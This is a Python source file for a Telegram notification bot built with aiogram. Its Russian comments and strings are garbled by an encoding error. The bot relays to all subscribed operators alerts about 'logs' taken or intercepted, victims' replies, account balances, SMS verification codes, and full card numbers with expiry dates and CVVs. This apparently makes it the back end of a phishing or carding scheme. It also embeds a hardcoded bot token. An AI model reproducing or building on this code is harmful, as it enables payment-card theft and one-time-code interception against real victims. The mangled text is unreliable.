# [file name]: admin_bot.py
# [file content begin]
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∞–¥–º–∏–Ω—Å–∫–æ–≥–æ –±–æ—Ç–∞
ADMIN_BOT_TOKEN = "8219818010:AAHtrunFkumr6i7hceJGIrSvqjXgluokDeI"  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω
admin_bot = Bot(token=ADMIN_BOT_TOKEN)
admin_dp = Dispatcher()

# –°–ø–∏—Å–æ–∫ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è ID –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–ø—É—Å—Ç–∏–ª–∏ –±–æ—Ç–∞
active_users = set()

async def send_to_all_admins(message: str, parse_mode: str = "HTML"):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –∞–¥–º–∏–Ω—Å–∫–æ–≥–æ –±–æ—Ç–∞"""
    for user_id in active_users.copy():  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –∫–æ–ø–∏—é —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤–æ –≤—Ä–µ–º—è –∏—Ç–µ—Ä–∞—Ü–∏–∏
        try:
            await admin_bot.send_message(chat_id=user_id, text=message, parse_mode=parse_mode)
        except Exception as e:
            print(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}: {e}")
            # –£–¥–∞–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ —Å–ø–∏—Å–∫–∞ –µ—Å–ª–∏ –±–æ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω
            active_users.discard(user_id)

async def notify_log_taken(booking_id: str, client_id: str, username: str, user_id: int):
    """–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –≤–∑—è—Ç–∏–∏ –ª–æ–≥–∞"""
    message = (
        f"üì• <b>–õ–æ–≥ –≤–∑—è—Ç</b>\n\n"
        f"üÜî #{booking_id} || #{client_id}\n"
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
        f"üî¢ ID: {user_id}"
    )
    await send_to_all_admins(message)

async def notify_log_taken_over(booking_id: str, client_id: str, new_username: str, new_user_id: int, old_user_id: int):
    """–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–µ –ª–æ–≥–∞"""
    message = (
        f"üîÑ <b>–õ–æ–≥ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω</b>\n\n"
        f"üÜî #{booking_id} || #{client_id}\n"
        f"üë§ –ù–æ–≤—ã–π –≤–ª–∞–¥–µ–ª–µ—Ü: @{new_username}\n"
        f"üî¢ ID: {new_user_id}\n"
        f"üì§ –ü—Ä–µ–¥—ã–¥—É—â–∏–π –≤–ª–∞–¥–µ–ª–µ—Ü ID: {old_user_id}"
    )
    await send_to_all_admins(message)

async def notify_action(booking_id: str, client_id: str, username: str, user_id: int, action: str, action_text: str):
    """–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –¥–µ–π—Å—Ç–≤–∏–∏ —Å –ª–æ–≥–æ–º"""
    message = (
        f"‚ö° <b>–î–µ–π—Å—Ç–≤–∏–µ —Å –ª–æ–≥–æ–º</b>\n\n"
        f"üÜî #{booking_id} || #{client_id}\n"
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
        f"üî¢ ID: {user_id}\n"
        f"üìù –î–µ–π—Å—Ç–≤–∏–µ: {action_text}"
    )
    await send_to_all_admins(message)

async def notify_user_response(booking_id: str, client_id: str, username: str, user_id: int, response: str):
    """–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –æ—Ç–≤–µ—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    message = (
        f"üí¨ <b>–û—Ç–≤–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b>\n\n"
        f"üÜî #{booking_id} || #{client_id}\n"
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
        f"üî¢ ID: {user_id}\n"
        f"üì® –û—Ç–≤–µ—Ç: {response}"
    )
    await send_to_all_admins(message)

async def notify_balance(booking_id: str, client_id: str, username: str, user_id: int, balance: str):
    """–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞"""
    message = (
        f"üí∞ <b>–ü–æ–ª—É—á–µ–Ω –±–∞–ª–∞–Ω—Å</b>\n\n"
        f"üÜî #{booking_id} || #{client_id}\n"
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
        f"üî¢ ID: {user_id}\n"
        f"üíµ –°—É–º–º–∞: {balance} AED"
    )
    await send_to_all_admins(message)

async def notify_sms(booking_id: str, client_id: str, username: str, user_id: int, sms_code: str):
    """–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–ª—É—á–µ–Ω–∏–∏ SMS"""
    message = (
        f"üì± <b>–ü–æ–ª—É—á–µ–Ω SMS –∫–æ–¥</b>\n\n"
        f"üÜî #{booking_id} || #{client_id}\n"
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
        f"üî¢ ID: {user_id}\n"
        f"üî¢ –ö–æ–¥: {sms_code}"
    )
    await send_to_all_admins(message)

async def notify_card_change(booking_id: str, client_id: str, username: str, user_id: int, new_card: str, expire: str, cvv: str):
    """–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Å–º–µ–Ω–µ –∫–∞—Ä—Ç—ã"""
    message = (
        f"üîÑ <b>–°–º–µ–Ω–∞ –∫–∞—Ä—Ç—ã</b>\n\n"
        f"üÜî #{booking_id} || #{client_id}\n"
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
        f"üî¢ ID: {user_id}\n"
        f"üí≥ –ù–æ–≤–∞—è –∫–∞—Ä—Ç–∞: {new_card}\n"
        f"üìÖ –°—Ä–æ–∫: {expire}\n"
        f"üîí CVV: {cvv}"
    )
    await send_to_all_admins(message)

# –ö–æ–º–∞–Ω–¥—ã –¥–ª—è –∞–¥–º–∏–Ω—Å–∫–æ–≥–æ –±–æ—Ç–∞
@admin_dp.message(Command("start"))
async def admin_start(message: types.Message):
    # –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö
    active_users.add(message.from_user.id)
    
    await message.answer(
        "üë®‚Äçüíº <b>–ê–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞</b>\n\n"
        "–≠—Ç–æ—Ç –±–æ—Ç —Ç—Ä–∞–Ω—Å–ª–∏—Ä—É–µ—Ç –≤—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±–æ—Ç–∞:\n"
        "‚Ä¢ –í–∑—è—Ç–∏–µ –ª–æ–≥–æ–≤\n‚Ä¢ –î–µ–π—Å—Ç–≤–∏—è —Å –∫–Ω–æ–ø–∫–∞–º–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è\n‚Ä¢ –û—Ç–≤–µ—Ç—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n"
        "‚Ä¢ –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–æ–≤ –∏ SMS –∫–æ–¥–æ–≤\n‚Ä¢ –°–º–µ–Ω—ã –∫–∞—Ä—Ç\n\n"
        "–í—Å–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø—Ä–∏—Ö–æ–¥—è—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.\n\n"
        f"‚úÖ –í—ã –¥–æ–±–∞–≤–ª–µ–Ω—ã –≤ —Å–ø–∏—Å–æ–∫ –ø–æ–ª—É—á–∞—Ç–µ–ª–µ–π. –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {len(active_users)}",
        parse_mode="HTML"
    )

@admin_dp.message(Command("status"))
async def admin_status(message: types.Message):
    await message.answer(
        f"‚úÖ –ë–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ —Ä–µ–∂–∏–º–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞\n"
        f"üë• –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {len(active_users)}"
    )

@admin_dp.message(Command("users"))
async def admin_users(message: types.Message):
    users_list = "\n".join([f"üë§ ID: {user_id}" for user_id in active_users])
    await message.answer(
        f"üìä –ê–∫—Ç–∏–≤–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –±–æ—Ç–∞:\n\n{users_list if users_list else '–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π'}"
    )

async def start_admin_bot():
    """–ó–∞–ø—É—Å–∫ –∞–¥–º–∏–Ω—Å–∫–æ–≥–æ –±–æ—Ç–∞"""
    print("–ê–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
    await admin_dp.start_polling(admin_bot)

if __name__ == "__main__":
    asyncio.run(start_admin_bot())
# [file content end]